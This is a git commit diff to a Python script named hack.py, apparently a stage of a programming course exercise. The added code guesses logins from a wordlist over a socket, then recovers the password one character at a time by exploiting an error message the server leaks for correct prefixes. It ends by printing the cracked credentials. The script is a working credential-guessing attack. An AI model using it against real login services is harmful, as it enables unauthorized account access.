06d5e9b5f6859d6979dd9f5b56e8df0373071e1f
fvn70 <fvn_reg@mail.ru>
2021-11-23 13:28:13 +0700

    Stage 4/5

--- hack.py
+++ hack.py
@@ -1,38 +1,73 @@
+import json
+import string
 from itertools import product
 import socket
 import sys
+from random import random
 
 args = sys.argv
 
+def get_resp(sock, log, pw):
+    msg = {"login": log, "password": pw}
+    msg = json.dumps(msg)
+    sock.send(msg.encode('utf8'))
+    resp = sock.recv(1024).decode('utf8')
+    resp = json.loads(resp)
+    return resp['result']
+
+def get_resp1(txt1, txt2):
+    msg = txt1 if random() < 0.2 else txt2
+    resp = json.dumps({
+        'result': msg
+        })
+    resp = json.loads(resp)
+    return resp['result']
+
+
 def recvest():
     address = (hostname, port)
-    g = gen_pass()
+    gl = gen_login()
     with socket.socket() as sock:
         try:
             sock.connect(address)
+            cur_pass = ' '
             while True:
-                msg = ''.join(next(g))
-                sock.send(msg.encode())
-                resp = sock.recv(1024)
-                resp = resp.decode()
+                cur_log = next(gl)
+                resp = get_resp(sock, cur_log, ' ')
+                # resp = get_resp1("Wrong password!", "Wrong login!")
                 if resp != "Wrong password!":
-                    break
-            if resp == "Connection success!":
-                print(msg)
+                    continue
+                login_ = cur_log
+                pass_ = ''
+                gp = gen_pass(0)
+                while True:
+                    cur_pass = pass_ + next(gp)
+                    resp = get_resp(sock, login_, cur_pass)
+                    # resp = get_resp1("Exception happened during login", "Connection success!")
+                    if "Exception happened during login" in resp:
+                        pass_ = cur_pass
+                        gp = gen_pass(0)
+                        continue
+                    if resp == "Connection success!":
+                        msg = {"login": login_, "password": cur_pass}
+                        print(json.dumps(msg))
+                        return
             else:
                 print(resp)
         except ConnectionRefusedError:
             print("No connection!")
 
-def gen_pass():
-    with open('passwords.txt', 'r') as file:
+def gen_login():
+    with open('logins.txt', 'r') as file:
         for word in file.readlines():
-            word = word.strip()
-            if word.lower() == word.upper():
-                yield word
-            else:
-                yield from map(lambda x: ''.join(x), product(*([l.lower(), l.upper()] for l in word)))
+            yield word.strip()
 
+def gen_pass(k0):
+    lst = string.digits + string.ascii_letters
+    k = k0
+    while True:
+        yield lst[k % len(lst)]
+        k += 1
 
 hostname = args[1]
 port = int(args[2])
